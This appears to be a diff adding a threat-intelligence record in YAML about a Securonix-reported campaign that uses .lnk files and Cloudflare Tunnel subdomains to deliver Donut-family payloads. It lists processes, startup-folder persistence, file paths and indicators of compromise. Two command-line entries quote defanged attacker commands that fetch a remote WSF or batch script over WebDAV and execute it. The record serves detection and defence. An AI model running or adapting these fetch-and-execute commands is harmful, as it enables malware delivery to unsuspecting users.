@@ -1,0 +1,59 @@
+description: Securonix threat researchers have been tracking a stealthy campaign involving
+  (.lnk) files to deliver remote payloads hosted on attacker-controlled Cloudflare
+  Tunnel subdomains.
+malware_families:
+- Donut
+TTPs:
+  processes:
+  - cmd.exe
+  - robocopy.exe
+  - cscript.exe
+  - python.exe
+  - notepad.exe
+  commandline:
+  - cmd.exe /c robocopy \\\\flour-riding-merit-refers.trycloudflare[.]com@SSL\\DavWWWRoot\\RE_02WSF
+    %temp% tank.wsf /ns /nc /nfl /ndl >nul & start /min  cscript.exe //nologo %temp%\\tank.wsf
+  - cmd.exe /c \\\\depot-arrange-zero-kai.trycloudflare[.]com@SSL\\DavWWWRoot\\kiki.bat
+  powershell: null
+  scripting_engine: null
+  registry_keys: null
+  image_load: null
+  network_connections:
+  - process: cmd.exe
+    destination: flour-riding-merit-refers.trycloudflare[.]com
+    port: 443
+  - process: python.exe
+    destination: 192.169.69[.]26
+    port: 7878
+  file_activity:
+  - '%temp%\\tank.wsf'
+  - C:\\Users\\username\\contacts\\cam.zip
+  - C:\\Users\\username\\contacts\\Extracted\\Jun02_an.py
+  - C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pws1.vbs
+  - C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\PWS.vbs
+  - C:\\Users\\username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startuppp.bat
+  persistence:
+  - Windows startup folder
+  pipes: null
+  process_relations: null
+IOCs:
+- flour-riding-merit-refers.trycloudflare[.]com
+- depot-arrange-zero-kai.trycloudflare[.]com
+- eastern-instructional-ant-jungle.trycloudflare[.]com/cam.zip
+- nhvncpure[.]shop
+- nhvncpurekfl.duckdns[.]org
+- 192.169.69[.]26
+- 51.89.212[.]145 [ip145.ip-51-89-212[.]eu]
+- nhvncpure[.]shop
+- nhvncpure[.]sbs
+- nhvncpure[.]click
+- duckdns[.]org
+- twilightparadox[.]com
+- strangled[.]net
+- mooo[.]com
+- nhvncpure[.]duckdns.org
+authors:
+- Tim Peck
+reference: https://www.securonix.com/blog/analyzing_serpentinecloud-threat-actors-abuse-cloudflare-tunnels-threat-research/
+date_of_publication: July 28, 2025
+file_creation_date: July 28, 2025
